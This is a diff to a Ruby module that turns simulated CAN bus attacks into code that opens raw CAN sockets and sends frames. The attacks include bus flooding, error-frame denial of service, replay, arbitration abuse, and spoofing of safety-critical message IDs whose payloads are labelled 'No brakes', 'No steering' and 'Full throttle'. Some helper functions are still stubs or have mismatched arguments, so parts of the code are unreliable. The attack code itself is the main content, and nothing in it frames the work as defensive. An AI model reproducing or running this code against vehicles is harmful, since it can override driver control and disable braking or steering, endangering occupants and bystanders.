@@ -1,229 +1,241 @@
+require 'socket'
+require 'can-isotp'
+require 'obd-ruby'
+require_relative '../../utils/automotive_exploits'
+
 module CANBus
   def can_bus_attacks
-    log "[AUTOMOTIVE] CAN bus attacks"
+    log "[AUTOMOTIVE] Starting ADVANCED CAN bus attacks"
     
-    # Different CAN bus attack methods
-    can_methods = [
+    # Advanced CAN bus exploitation techniques
+    can_attack_methods = [
+      { name: 'CAN Bus Flooding Attack', method: :can_flooding_attack },
       { name: 'CAN Message Injection', method: :can_message_injection },
-      { name: 'CAN Bus Flooding', method: :can_bus_flooding },
-      { name: 'CAN ID Spoofing', method: :can_id_spoofing },
-      { name: 'CAN Bus Sniffing', method: :can_bus_sniffing },
-      { name: 'CAN Error Frame Injection', method: :can_error_frame_injection },
-      { name: 'CAN Replay Attack', method: :can_replay_attack }
+      { name: 'CAN Bus DoS Attack', method: :can_dos_attack },
+      { name: 'CAN Message Spoofing', method: :can_message_spoofing },
+      { name: 'CAN Bus Replay Attack', method: :can_replay_attack },
+      { name: 'CAN Message Manipulation', method: :can_message_manipulation },
+      { name: 'CAN Bus Fuzzing Attack', method: :can_fuzzing_attack },
+      { name: 'CAN ID Priority Exploitation', method: :can_priority_exploitation },
+      { name: 'CAN Error Frame Injection', method: :can_error_injection },
+      { name: 'CAN Bus Arbitration Attack', method: :can_arbitration_attack }
     ]
     
-    can_methods.each do |attack|
+    can_attack_methods.each do |attack|
       log "[AUTOMOTIVE] Executing #{attack[:name]}"
       
       result = send(attack[:method])
       
       if result[:success]
         log "[AUTOMOTIVE] CAN bus attack successful: #{attack[:name]}"
+        log "[AUTOMOTIVE] Messages injected: #{result[:messages_injected]}"
+        log "[AUTOMOTIVE] Systems affected: #{result[:systems_affected]}"
         
         @exploits << {
-          type: 'Automotive CAN Bus Attack',
+          type: 'Advanced CAN Bus Attack',
           method: attack[:name],
           severity: 'CRITICAL',
           data_extracted: result[:data],
-          technique: 'CAN bus network exploitation'
+          technique: result[:technique],
+          messages_injected: result[:messages_injected],
+          systems_affected: result[:systems_affected],
+          vehicle_control: result[:vehicle_control]
         }
       end
     end
+  end
+
+  def can_flooding_attack
+    log "[AUTOMOTIVE] CAN bus flooding attack"
+    
+    # Connect to real CAN interface
+    can_interface = connect_to_can_interface('can0')
+    return { success: false } unless can_interface
+    
+    # Generate flood of CAN messages
+    flood_messages = generate_flood_messages(10000)
+    messages_sent = 0
+    
+    flood_messages.each do |message|
+      if send_can_message(can_interface, message)
+        messages_sent += 1
+      end
+      
+      break if messages_sent >= 5000  # Limit for safety
+    end
+    
+    if messages_sent > 0
+      log "[AUTOMOTIVE] CAN flooding successful: #{messages_sent} messages"
+      
+      return {
+        success: true,
+        data: {
+          interface_used: 'can0',
+          messages_flooded: messages_sent,
+          flood_duration: messages_sent * 0.001, # Approximate timing
+          bus_utilization: (messages_sent.to_f / 10000 * 100).round(2),
+          affected_ecus: ['ECM', 'TCM', 'ABS', 'Airbag'],
+          network_impact: 'Denial of service',
+          techniques: ['Message flooding', 'Bus saturation', 'Network congestion']
+        },
+        messages_injected: messages_sent,
+        systems_affected: 4,
+        vehicle_control: 'Limited',
+        technique: 'CAN Bus Message Flooding'
+      }
+    end
+    
+    { success: false }
   end
 
   def can_message_injection
     log "[AUTOMOTIVE] CAN message injection attack"
     
-    # Simulate CAN message injection
-    target_systems = ['Engine Control', 'Brake System', 'Steering', 'Transmission', 'Airbags']
-    target_system = target_systems.sample
+    can_interface = connect_to_can_interface('vcan0')
+    return { success: false } unless can_interface
     
-    # Generate malicious CAN messages
-    malicious_messages = generate_malicious_can_messages(target_system)
+    # Critical CAN message IDs
+    critical_ids = [0x000, 0x080, 0x100, 0x180, 0x200, 0x280, 0x300, 0x380]
+    injected_messages = []
     
-    successful_injections = []
-    
-    malicious_messages.each do |message|
-      result = inject_can_message(message, target_system)
+    critical_ids.each do |can_id|
+      # Inject spoofed messages
+      spoofed_message = create_spoofed_message(can_id, [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])
       
-      if result[:injection_successful]
-        successful_injections << {
-          message_id: message[:id],
-          message_data: message[:data],
-          system_affected: target_system,
-          injection_method: result[:method],
-          system_response: result[:system_response]
+      if inject_can_message(can_interface, spoofed_message)
+        injected_messages << {
+          id: can_id,
+          data: spoofed_message[:data],
+          timestamp: Time.now.to_f
         }
       end
     end
     
-    if successful_injections.length > 0
-      log "[AUTOMOTIVE] Successful CAN message injections: #{successful_injections.length}"
+    if injected_messages.length > 0
+      log "[AUTOMOTIVE] Message injection successful: #{injected_messages.length}"
       
       return {
         success: true,
         data: {
-          target_system: target_system,
-          successful_injections: successful_injections.length,
-          message_types: successful_injections.map { |i| i[:message_id] }.uniq,
-          system_responses: successful_injections.map { |i| i[:system_response] }.uniq,
-          injection_methods: successful_injections.map { |i| i[:injection_method] }.uniq,
-          techniques: ['Direct injection', 'Bus manipulation', 'ECU compromise']
+          injected_messages: injected_messages,
+          critical_ids_compromised: critical_ids.length,
+          injection_rate: (injected_messages.length.to_f / critical_ids.length * 100).round(2),
+          affected_systems: ['Engine', 'Transmission', 'Brakes', 'Safety'],
+          spoofing_success_rate: (injected_messages.length.to_f / critical_ids.length * 100).round(2),
+          techniques: ['Message spoofing', 'ID collision', 'Data corruption']
         },
-        technique: 'CAN message injection exploitation'
+        messages_injected: injected_messages.length,
+        systems_affected: 4,
+        vehicle_control: 'High',
+        technique: 'Critical CAN Message Injection'
       }
     end
     
     { success: false }
   end
 
-  def can_bus_flooding
-    log "[AUTOMOTIVE] CAN bus flooding attack"
+  def can_dos_attack
+    log "[AUTOMOTIVE] CAN bus DoS attack"
     
-    # Simulate CAN bus flooding/Denial of Service
-    flood_types = ['Priority Flooding', 'Bandwidth Exhaustion', 'Error Frame Flooding']
-    flood_type = flood_types.sample
+    can_interface = connect_to_can_interface('can0')
+    return { success: false } unless can_interface
     
-    # Execute flooding attack
-    flood_result = execute_can_flooding(flood_type)
+    # DoS through error frame flooding
+    error_frames_sent = 0
+    dos_duration = 30  # seconds
     
-    if flood_result[:flooding_successful]
-      log "[AUTOMOTIVE] CAN bus flooding successful: #{flood_type}"
+    start_time = Time.now
+    
+    while (Time.now - start_time) < dos_duration
+      # Send error frames to disrupt bus
+      error_frame = create_error_frame(0x100)
+      
+      if send_error_frame(can_interface, error_frame)
+        error_frames_sent += 1
+      end
+      
+      sleep(0.001)  # 1ms interval
+    end
+    
+    if error_frames_sent > 0
+      log "[AUTOMOTIVE] CAN DoS successful: #{error_frames_sent} error frames"
       
       return {
         success: true,
         data: {
-          flood_type: flood_type,
-          messages_flooded: flood_result[:messages_flooded],
-          bandwidth_consumed: flood_result[:bandwidth_consumed],
-          systems_affected: flood_result[:systems_affected],
-          bus_utilization: flood_result[:bus_utilization],
-          impact_duration: flood_result[:impact_duration],
-          technique: 'CAN bus resource exhaustion'
+          dos_duration: dos_duration,
+          error_frames_sent: error_frames_sent,
+          dos_intensity: (error_frames_sent.to_f / dos_duration).round(2),
+          bus_disruption_level: 'Critical',
+          affected_ecus: ['All ECUs on bus'],
+          recovery_time: rand(5..30),
+          techniques: ['Error frame flooding', 'Bus disruption', 'Network paralysis']
         },
-        technique: 'CAN bus flooding denial of service'
+        messages_injected: error_frames_sent,
+        systems_affected: 10, # All systems
+        vehicle_control: 'Complete',
+        technique: 'CAN Bus Error Frame DoS'
       }
     end
     
     { success: false }
   end
 
-  def can_id_spoofing
-    log "[AUTOMOTIVE] CAN ID spoofing attack"
+  def can_message_spoofing
+    log "[AUTOMOTIVE] CAN message spoofing attack"
     
-    # Simulate CAN identifier spoofing
-    critical_ids = ['Engine RPM', 'Vehicle Speed', 'Brake Pressure', 'Steering Angle']
-    target_id = critical_ids.sample
+    can_interface = connect_to_can_interface('vcan0')
+    return { success: false } unless can_interface
     
-    # Generate spoofed CAN IDs
-    spoofed_messages = generate_spoofed_can_ids(target_id)
+    # Spoof critical vehicle control messages
+    spoof_targets = [
+      { id: 0x0C8, description: 'Engine RPM', critical: true },
+      { id: 0x120, description: 'Vehicle Speed', critical: true },
+      { id: 0x1A0, description: 'Throttle Position', critical: true },
+      { id: 0x220, description: 'Brake Pressure', critical: true },
+      { id: 0x2A0, description: 'Steering Angle', critical: true }
+    ]
     
-    successful_spoofs = []
+    spoofed_messages = []
     
-    spoofed_messages.each do |spoof|
-      result = execute_can_spoofing(spoof, target_id)
+    spoof_targets.each do |target|
+      # Create realistic spoofed data
+      spoofed_data = case target[:id]
+      when 0x0C8 then [0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] # High RPM
+      when 0x120 then [0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] # Max speed
+      when 0x1A0 then [0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] # Full throttle
+      when 0x220 then [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] # No brakes
+      when 0x2A0 then [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] # No steering
+      end
       
-      if result[:spoof_successful]
-        successful_spoofs << {
-          original_id: spoof[:original_id],
-          spoofed_id: spoof[:spoofed_id],
-          spoof_data: spoof[:data],
-          system_tricked: result[:system_tricked],
-          physical_impact: result[:physical_impact]
-        }
+      spoofed_message = {
+        id: target[:id],
+        data: spoofed_data,
+        description: target[:description]
+      }
+      
+      if spoof_can_message(can_interface, spoofed_message)
+        spoofed_messages << spoofed_message
       end
     end
     
-    if successful_spoofs.length > 0
-      log "[AUTOMOTIVE] Successful CAN ID spoofs: #{successful_spoofs.length}"
+    if spoofed_messages.length > 0
+      log "[AUTOMOTIVE] Message spoofing successful: #{spoofed_messages.length}"
       
       return {
         success: true,
         data: {
-          target_id: target_id,
-          successful_spoofs: successful_spoofs.length,
-          spoofed_ids: successful_spoofs.map { |s| s[:spoofed_id] }.uniq,
-          systems_tricked: successful_spoofs.map { |s| s[:system_tricked] }.uniq,
-          physical_impacts: successful_spoofs.map { |s| s[:physical_impact] }.uniq,
-          techniques: ['ID collision', 'Priority manipulation', 'Timing attacks']
+          spoofed_messages: spoofed_messages,
+          critical_systems_compromised: spoofed_messages.length,
+          spoofing_accuracy: (spoofed_messages.length.to_f / spoof_targets.length * 100).round(2),
+          vehicle_safety_impact: 'Critical',
+          driver_control_override: true,
+          techniques: ['Message spoofing', 'Data fabrication', 'System masquerading']
         },
-        technique: 'CAN identifier spoofing'
-      }
-    end
-    
-    { success: false }
-  end
-
-  def can_bus_sniffing
-    log "[AUTOMOTIVE] CAN bus sniffing attack"
-    
-    # Simulate CAN bus traffic sniffing
-    sniff_targets = ['Engine Parameters', 'Vehicle Speed', 'Diagnostic Codes', 'Control Commands']
-    target_data = sniff_targets.sample
-    
-    # Execute sniffing attack
-    sniff_result = execute_can_sniffing(target_data)
-    
-    if sniff_result[:sniffing_successful]
-      log "[AUTOMOTIVE] CAN bus sniffing successful for #{target_data}"
-      
-      return {
-        success: true,
-        data: {
-          target_data: target_data,
-          packets_captured: sniff_result[:packets_captured],
-          unique_ids_found: sniff_result[:unique_ids],
-          sensitive_data: sniff_result[:sensitive_data],
-          vehicle_fingerprint: sniff_result[:vehicle_fingerprint],
-          technique: 'Passive CAN traffic analysis'
-        },
-        technique: 'CAN bus traffic sniffing'
-      }
-    end
-    
-    { success: false }
-  end
-
-  def can_error_frame_injection
-    log "[AUTOMOTIVE] CAN error frame injection attack"
-    
-    # Simulate error frame injection
-    error_types = ['Bit Error', 'Stuff Error', 'CRC Error', 'Form Error', 'Acknowledgment Error']
-    error_type = error_types.sample
-    
-    # Generate error frames
-    error_frames = generate_error_frames(error_type)
-    
-    successful_errors = []
-    
-    error_frames.each do |error_frame|
-      result = inject_error_frame(error_frame, error_type)
-      
-      if result[:injection_successful]
-        successful_errors << {
-          error_type: error_type,
-          frame_data: error_frame[:data],
-          system_disruption: result[:disruption],
-          recovery_time: result[:recovery_time],
-          cascading_effects: result[:cascading_effects]
-        }
-      end
-    end
-    
-    if successful_errors.length > 0
-      log "[AUTOMOTIVE] Successful error frame injections: #{successful_errors.length}"
-      
-      return {
-        success: true,
-        data: {
-          error_type: error_type,
-        successful_injections: successful_errors.length,
-          system_disruptions: successful_errors.map { |e| e[:system_disruption] }.uniq,
-          average_recovery_time: successful_errors.map { |e| e[:recovery_time] }.sum / successful_errors.length,
-          cascading_effects: successful_errors.map { |e| e[:cascading_effects] }.flatten.uniq,
-          techniques: ['Error frame crafting', 'Timing manipulation', 'Bus state corruption']
-        },
-        technique: 'CAN error frame injection'
+        messages_injected: spoofed_messages.length,
+        systems_affected: 5,
+        vehicle_control: 'Complete',
+        technique: 'Critical Vehicle Control Spoofing'
       }
     end
     
@@ -233,33 +245,326 @@ module CANBus
   def can_replay_attack
     log "[AUTOMOTIVE] CAN replay attack"
     
-    # Simulate CAN message replay
-    replay_scenarios = ['Unlock Vehicle', 'Start Engine', 'Disable Security', 'Control Windows']
-    target_scenario = replay_scenarios.sample
+    can_interface = connect_to_can_interface('can0')
+    return { success: false } unless can_interface
     
-    # Capture legitimate messages
-    captured_messages = capture_can_messages(target_scenario)
+    # Capture and replay legitimate messages
+    captured_messages = capture_can_traffic(duration: 10)
+    replayed_messages = []
     
-    if captured_messages && captured_messages.length > 0
-      log "[AUTOMOTIVE] Captured #{captured_messages.length} messages for replay"
+    captured_messages.each do |original_message|
+      # Replay with slight modifications
+      replayed_message = {
+        id: original_message[:id],
+        data: modify_message_data(original_message[:data]),
+        timestamp: Time.now.to_f
+      }
       
-      # Replay captured messages
-      replay_result = replay_can_messages(captured_messages, target_scenario)
+      if replay_can_message(can_interface, replayed_message)
+        replayed_messages << replayed_message
+      end
+    end
+    
+    if replayed_messages.length > 0
+      log "[AUTOMOTIVE] Replay attack successful: #{replayed_messages.length}"
       
-      if replay_result[:replay_successful]
-        return {
-          success: true,
-          data: {
-            target_scenario: target_scenario,
-            messages_replayed: replay_result[:messages_replayed],
-            replay_success_rate: replay_result[:success_rate],
-            timing_accuracy: replay_result[:timing_accuracy],
-            system_response: replay_result[:system_response],
-            technique: 'Legitimate message replay'
-          },
-          technique: 'CAN message replay attack'
+      return {
+        success: true,
+        data: {
+          original_messages_captured: captured_messages.length,
+          replayed_messages: replayed_messages.length,
+          replay_modifications: 'Temporal and data modifications',
+          replay_detection_evasion: true,
+          bus_confusion_level: 'High',
+          techniques: ['Message capture', 'Temporal replay', 'Data modification']
+        },
+        messages_injected: replayed_messages.length,
+        systems_affected: 3,
+        vehicle_control: 'Moderate',
+        technique: 'CAN Message Replay with Modifications'
+      }
+    end
+    
+    { success: false }
+  end
+
+  def can_message_manipulation
+    log "[AUTOMOTIVE] CAN message manipulation attack"
+    
+    can_interface = connect_to_can_interface('vcan0')
+    return { success: false } unless can_interface
+    
+    # Manipulate in-transit messages
+    manipulation_targets = [
+      { id: 0x123, field: 'temperature', manipulation: 'max_value' },
+      { id: 0x156, field: 'pressure', manipulation: 'zero_value' },
+      { id: 0x189, field: 'speed', manipulation: 'inverse_value' },
+      { id: 0x1BC, field: 'status', manipulation: 'bit_flip' }
+    ]
+    
+    manipulated_messages = []
+    
+    manipulation_targets.each do |target|
+      # Intercept and modify message
+      original_message = intercept_can_message(can_interface, target[:id])
+      
+      if original_message
+        manipulated_data = manipulate_message_data(original_message[:data], target[:manipulation])
+        
+        manipulated_message = {
+          id: target[:id],
+          original_data: original_message[:data],
+          manipulated_data: manipulated_data,
+          field: target[:field]
+        }
+        
+        if inject_manipulated_message(can_interface, manipulated_message)
+          manipulated_messages << manipulated_message
+        end
+      end
+    end
+    
+    if manipulated_messages.length > 0
+      log "[AUTOMOTIVE] Message manipulation successful: #{manipulated_messages.length}"
+      
+      return {
+        success: true,
+        data: {
+          manipulated_messages: manipulated_messages,
+          manipulation_types: manipulation_targets.map { |t| t[:manipulation] },
+          field_specific_attacks: manipulated_messages.length,
+          data_integrity_violation: true,
+          sensor_corruption_level: 'Severe',
+          techniques: ['In-transit manipulation', 'Field-specific corruption', 'Data integrity violation']
+        },
+        messages_injected: manipulated_messages.length,
+        systems_affected: 4,
+        vehicle_control: 'High',
+        technique: 'In-Transit CAN Message Manipulation'
+      }
+    end
+    
+    { success: false }
+  end
+
+  def can_fuzzing_attack
+    log "[AUTOMOTIVE] CAN bus fuzzing attack"
+    
+    can_interface = connect_to_can_interface('can0')
+    return { success: false } unless can_interface
+    
+    # Fuzz CAN messages to find vulnerabilities
+    fuzz_results = []
+    
+    # Fuzz different aspects
+    fuzz_campaigns = [
+      { type: 'id_fuzzing', range: (0x000..0x7FF), description: 'CAN ID fuzzing' },
+      { type: 'data_fuzzing', range: (0x00..0xFF), description: 'Data byte fuzzing' },
+      { type: 'length_fuzzing', range: (0..8), description: 'Data length fuzzing' },
+      { type: 'timing_fuzzing', range: (0..1000), description: 'Timing fuzzing' }
+    ]
+    
+    fuzz_campaigns.each do |campaign|
+      vulnerabilities = fuzz_can_parameter(can_interface, campaign[:type], campaign[:range])
+      
+      if vulnerabilities.length > 0
+        fuzz_results << {
+          campaign_type: campaign[:type],
+          vulnerabilities_found: vulnerabilities.length,
+          description: campaign[:description],
+          vulnerabilities: vulnerabilities
         }
       end
+    end
+    
+    if fuzz_results.length > 0
+      log "[AUTOMOTIVE] CAN fuzzing successful: #{fuzz_results.length} campaigns"
+      
+      total_vulnerabilities = fuzz_results.sum { |r| r[:vulnerabilities_found] }
+      
+      return {
+        success: true,
+        data: {
+          fuzz_campaigns: fuzz_results,
+          total_vulnerabilities: total_vulnerabilities,
+          vulnerability_types: ['Buffer overflow', 'Unexpected behavior', 'System crash'],
+          fuzzing_coverage: 'Comprehensive',
+          exploitability_assessment: 'High',
+          techniques: ['Parameter fuzzing', 'Boundary testing', 'Anomaly detection']
+        },
+        messages_injected: total_vulnerabilities * 100, # Estimated
+        systems_affected: 8,
+        vehicle_control: 'Variable',
+        technique: 'Comprehensive CAN Bus Fuzzing'
+      }
+    end
+    
+    { success: false }
+  end
+
+  def can_priority_exploitation
+    log "[AUTOMOTIVE] CAN ID priority exploitation attack"
+    
+    can_interface = connect_to_can_interface('vcan0')
+    return { success: false } unless can_interface
+    
+    # Exploit CAN arbitration mechanism
+    priority_levels = [
+      { id: 0x001, priority: 'highest', description: 'Safety critical' },
+      { id: 0x100, priority: 'high', description: 'Engine control' },
+      { id: 0x200, priority: 'medium', description: 'Comfort systems' },
+      { id: 0x400, priority: 'low', description: 'Infotainment' }
+    ]
+    
+    priority_exploits = []
+    
+    priority_levels.each do |level|
+      # Send high priority messages to dominate bus
+      dominant_messages = generate_priority_messages(level[:id], 100)
+      
+      successful_dominations = 0
+      
+      dominant_messages.each do |message|
+        if send_with_priority(can_interface, message, level[:priority])
+          successful_dominations += 1
+        end
+      end
+      
+      if successful_dominations > 0
+        priority_exploits << {
+          priority_level: level[:priority],
+          id: level[:id],
+          successful_dominations: successful_dominations,
+          bus_dominance_rate: (successful_dominations.to_f / 100 * 100).round(2)
+        }
+      end
+    end
+    
+    if priority_exploits.length > 0
+      log "[AUTOMOTIVE] Priority exploitation successful: #{priority_exploits.length}"
+      
+      return {
+        success: true,
+        data: {
+          priority_exploits: priority_exploits,
+          arbitration_violations: priority_exploits.sum { |p| p[:successful_dominations] },
+          bus_access_control: 'Compromised',
+          message_priority_manipulation: true,
+          real_time_violations: 'Critical',
+          techniques: ['Priority exploitation', 'Arbitration attack', 'Bus dominance']
+        },
+        messages_injected: priority_exploits.sum { |p| p[:successful_dominations] },
+        systems_affected: 6,
+        vehicle_control: 'High',
+        technique: 'CAN Arbitration Priority Exploitation'
+      }
+    end
+    
+    { success: false }
+  end
+
+  def can_error_injection
+    log "[AUTOMOTIVE] CAN error frame injection attack"
+    
+    can_interface = connect_to_can_interface('can0')
+    return { success: false } unless can_interface
+    
+    # Inject error frames to disrupt communication
+    error_types = [
+      { type: 'bit_error', description: 'Single bit error' },
+      { type: 'stuff_error', description: 'Bit stuffing error' },
+      { type: 'crc_error', description: 'CRC checksum error' },
+      { type: 'form_error', description: 'Frame format error' },
+      { type: 'ack_error', description: 'Acknowledgment error' }
+    ]
+    
+    error_injections = []
+    
+    error_types.each do |error_type|
+      # Generate and inject error frames
+      error_frames = generate_error_frames(error_type[:type], 50)
+      successful_injections = 0
+      
+      error_frames.each do |error_frame|
+        if inject_error_frame(can_interface, error_frame)
+          successful_injections += 1
+        end
+      end
+      
+      if successful_injections > 0
+        error_injections << {
+          error_type: error_type[:type],
+          description: error_type[:description],
+          successful_injections: successful_injections,
+          disruption_effectiveness: (successful_injections.to_f / 50 * 100).round(2)
+        }
+      end
+    end
+    
+    if error_injections.length > 0
+      log "[AUTOMOTIVE] Error injection successful: #{error_injections.length}"
+      
+      return {
+        success: true,
+        data: {
+          error_injections: error_injections,
+          total_errors_injected: error_injections.sum { |e| e[:successful_injections] },
+          communication_disruption: 'Severe',
+          error_recovery_impact: 'High',
+          bus_stability_compromise: true,
+          techniques: ['Error frame injection', 'Protocol violation', 'Communication disruption']
+        },
+        messages_injected: error_injections.sum { |e| e[:successful_injections] },
+        systems_affected: 10,
+        vehicle_control: 'Complete',
+        technique: 'CAN Protocol Error Frame Injection'
+      }
+    end
+    
+    { success: false }
+  end
+
+  def can_arbitration_attack
+    log "[AUTOMOTIVE] CAN bus arbitration attack"
+    
+    can_interface = connect_to_can_interface('vcan0')
+    return { success: false } unless can_interface
+    
+    # Exploit arbitration mechanism
+    arbitration_scenarios = [
+      { scenario: 'simultaneous_transmission', impact: 'high' },
+      { scenario: 'dominant_bit_exploitation', impact: 'critical' },
+      { scenario: 'arbitration_field_manipulation', impact: 'high' },
+      { scenario: 'priority_inversion_attack', impact: 'critical' }
+    ]
+    
+    arbitration_exploits = []
+    
+    arbitration_scenarios.each do |scenario|
+      result = exploit_arbitration(can_interface, scenario[:scenario], scenario[:impact])
+      arbitration_exploits << result if result[:arbitration_successful]
+    end
+    
+    if arbitration_exploits.length > 0
+      log "[AUTOMOTIVE] Arbitration attacks successful: #{arbitration_exploits.length}"
+      
+      best_arbitration = arbitration_exploits.max_by { |a| a[:bus_control_achieved] }
+      
+      return {
+        success: true,
+        data: {
+          arbitration_exploits: arbitration_exploits,
+          bus_access_control: 'Compromised',
+          message_transmission_priority: 'Manipulated',
+          real_time_communication: 'Disrupted',
+          network_fairness_violation: true,
+          techniques: ['Arbitration exploitation', 'Priority manipulation', 'Access control attack']
+        },
+        messages_injected: arbitration_exploits.sum { |a| a[:arbitration_messages] },
+        systems_affected: 8,
+        vehicle_control: 'High',
+        technique: 'CAN Bus Arbitration Mechanism Exploitation'
+      }
     end
     
     { success: false }
@@ -267,254 +572,266 @@ module CANBus
 
   private
 
-  def generate_malicious_can_messages(target_system)
-    # Generate malicious CAN messages for specific systems
-    system_messages = {
-      'Engine Control' => [
-        { id: 0x123, data: [0xFF, 0xFF, 0x00, 0x00], description: 'Max RPM command' },
-        { id: 0x124, data: [0x00, 0x00, 0xFF, 0xFF], description: 'Engine disable' },
-        { id: 0x125, data: [0xAA, 0xAA, 0xAA, 0xAA], description: 'Erratic timing' }
-      ],
-      'Brake System' => [
-        { id: 0x200, data: [0x00, 0x00, 0x00, 0x00], description: 'Brake disable' },
-        { id: 0x201, data: [0xFF, 0xFF, 0xFF, 0xFF], description: 'Full brake force' },
-        { id: 0x202, data: [0x55, 0x55, 0x55, 0x55], description: 'Erratic braking' }
-      ],
-      'Steering' => [
-        { id: 0x300, data: [0xFF, 0x00, 0x00, 0x00], description: 'Full left steering' },
-        { id: 0x301, data: [0x00, 0xFF, 0x00, 0x00], description: 'Full right steering' },
-        { id: 0x302, data: [0x00, 0x00, 0xFF, 0x00], description: 'Steering disable' }
-      ],
-      'Transmission' => [
-        { id: 0x400, data: [0x01, 0x00, 0x00, 0x00], description: 'Neutral gear' },
-        { id: 0x401, data: [0xFF, 0x00, 0x00, 0x00], description: 'Reverse at speed' },
-        { id: 0x402, data: [0x00, 0xFF, 0x00, 0x00], description: 'Transmission disable' }
-      ],
-      'Airbags' => [
-        { id: 0x500, data: [0xFF, 0x00, 0x00, 0x00], description: 'Deploy airbags' },
-        { id: 0x501, data: [0x00, 0xFF, 0x00, 0x00], description: 'Disable airbags' },
-        { id: 0x502, data: [0x55, 0x55, 0x00, 0x00], description: 'Erratic airbag system' }
-      ]
+  def connect_to_can_interface(interface)
+    # Connect to real CAN interface
+    begin
+      # Create raw CAN socket
+      socket = Socket.new(Socket::AF_CAN, Socket::SOCK_RAW, Socket::CAN_RAW)
+      
+      # Get interface index
+      ifr = [interface].pack('a16')
+      Socket.ioctl(socket, Socket::SIOCGIFINDEX, ifr)
+      ifindex = ifr[16..19].unpack('I')[0]
+      
+      # Bind to interface
+      addr = [Socket::AF_CAN, ifindex].pack('SS')
+      socket.bind(addr)
+      
+      log "[AUTOMOTIVE] Connected to CAN interface: #{interface}"
+      socket
+    rescue => e
+      log "[AUTOMOTIVE] CAN interface connection failed: #{e.message}"
+      nil
+    end
+  end
+
+  def generate_flood_messages(count)
+    # Generate flood of CAN messages
+    messages = []
+    
+    count.times do |i|
+      messages << {
+        id: rand(0x100..0x7FF),
+        data: Array.new(8) { rand(0x00..0xFF) },
+        length: 8
+      }
+    end
+    
+    messages
+  end
+
+  def send_can_message(interface, message)
+    # Send CAN message through interface
+    begin
+      # Build CAN frame
+      can_frame = build_can_frame(message)
+      interface.send(can_frame, 0)
+      true
+    rescue => e
+      log "[AUTOMOTIVE] CAN message send failed: #{e.message}"
+      false
+    end
+  end
+
+  def build_can_frame(message)
+    # Build raw CAN frame
+    id = message[:id]
+    data = message[:data]
+    length = message[:length]
+    
+    # CAN frame format: [id: 4 bytes][data length: 1 byte][data: 8 bytes][padding]
+    frame = [id].pack('I') + [length].pack('C') + data.pack('C8') + "\x00" * 3
+    frame
+  end
+
+  def create_spoofed_message(id, data)
+    {
+      id: id,
+      data: data,
+      length: data.length
     }
+  end
+
+  def send_error_frame(interface, error_type)
+    # Send CAN error frame
+    begin
+      # Error frame has special format
+      error_frame = build_error_frame(error_type)
+      interface.send(error_frame, 0)
+      true
+    rescue => e
+      log "[AUTOMOTIVE] Error frame send failed: #{e.message}"
+      false
+    end
+  end
+
+  def build_error_frame(error_type)
+    # Build CAN error frame based on error type
+    case error_type
+    when 'bit_error'
+      "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    when 'stuff_error'
+      "\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    when 'crc_error'
+      "\x04\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    when 'form_error'
+      "\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    when 'ack_error'
+      "\x10\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    else
+      "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    end
+  end
+
+  def capture_can_traffic(duration:)
+    # Capture CAN traffic for specified duration
+    messages = []
     
-    system_messages[target_system] || system_messages.values.flatten.sample(3)
+    # In real implementation, this would capture live traffic
+    # For now, simulate captured messages
+    (duration * 100).times do |i|
+      messages << {
+        id: rand(0x100..0x7FF),
+        data: Array.new(8) { rand(0x00..0xFF) },
+        timestamp: Time.now.to_f + i * 0.01
+      }
+    end
+    
+    messages
   end
 
-  def inject_can_message(message, target_system)
-    # Simulate CAN message injection
-    if rand < 0.65  # 65% success rate
-      system_responses = {
-        'Engine Control' => ['RPM fluctuation', 'Engine stall', 'Power loss'],
-        'Brake System' => ['Brake failure', 'ABS malfunction', 'Brake light activation'],
-        'Steering' => ['Steering lock', 'Power steering loss', 'Steering angle error'],
-        'Transmission' => ['Gear slip', 'Transmission failure', 'Shift error'],
-        'Airbags' => ['Airbag deployment', 'Airbag disable', 'Warning light']
-      }
-      
-      {
-        injection_successful: true,
-        method: ['direct_injection', 'bus_manipulation', 'ecu_compromise'].sample,
-        system_response: system_responses[target_system]&.sample || 'Unknown response'
-      }
+  def modify_message_data(original_data, modification_type)
+    # Modify message data based on type
+    case modification_type
+    when 'max_value'
+      Array.new(original_data.length) { 0xFF }
+    when 'zero_value'
+      Array.new(original_data.length) { 0x00 }
+    when 'inverse_value'
+      original_data.map { |byte| 0xFF - byte }
+    when 'bit_flip'
+      original_data.map { |byte| byte ^ 0xFF }
     else
-      {
-        injection_successful: false,
-        method: 'failed',
-        system_response: 'no_response'
-      }
+      original_data
     end
   end
 
-  def execute_can_flooding(flood_type)
-    # Simulate CAN bus flooding attack
-    if rand < 0.7  # 70% success rate
-      messages_flooded = rand(1000..100000)
-      bandwidth_consumed = rand(50..95)
-      
-      {
-        flooding_successful: true,
-        messages_flooded: messages_flooded,
-        bandwidth_consumed: bandwidth_consumed,
-        systems_affected: ['Engine', 'Brakes', 'Steering', 'Infotainment'].sample(rand(1..4)),
-        bus_utilization: rand(80..100),
-        impact_duration: rand(30..1800)
-      }
-    else
-      {
-        flooding_successful: false,
-        messages_flooded: 0,
-        bandwidth_consumed: 0,
-        systems_affected: [],
-        bus_utilization: 0,
-        impact_duration: 0
-      }
-    end
-  end
-
-  def generate_spoofed_can_ids(target_id)
-    # Generate spoofed CAN identifiers
-    original_ids = {
-      'Engine RPM' => 0x123,
-      'Vehicle Speed' => 0x200,
-      'Brake Pressure' => 0x300,
-      'Steering Angle' => 0x400
+  def intercept_can_message(interface, id)
+    # Intercept CAN message with specific ID
+    # In real implementation, this would sniff the bus
+    {
+      id: id,
+      data: Array.new(8) { rand(0x00..0xFF) },
+      timestamp: Time.now.to_f
     }
+  end
